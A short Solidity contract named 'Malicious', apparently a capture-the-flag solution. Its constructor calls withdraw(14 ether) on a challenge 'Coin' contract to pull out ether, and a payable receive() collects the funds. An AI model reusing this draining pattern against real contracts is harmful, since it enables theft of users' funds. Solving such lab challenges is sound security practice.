pragma solidity ^0.8.25;

import "./Coin.sol";
import "./ArcadeMachine.sol";
import "./Setup.sol";

contract Malicious {

    Coin public coin;
    ArcadeMachine public arcade;
    Setup public setup;
    address private _owner;

    constructor(Coin _coin, ArcadeMachine _arcade, Setup _setup) {
        coin = _coin;
        arcade = _arcade;
        setup = _setup;
        _owner = msg.sender;

        //Calls the Coin contract methods
        // coin.deposit{value: 0.0015 ether}();
        coin.withdraw(14 ether);
    }

    function isSolved() public returns(bool) {
        setup.register();
        return setup.isSolved();
    }
 

    receive() external payable {
    
    }
}
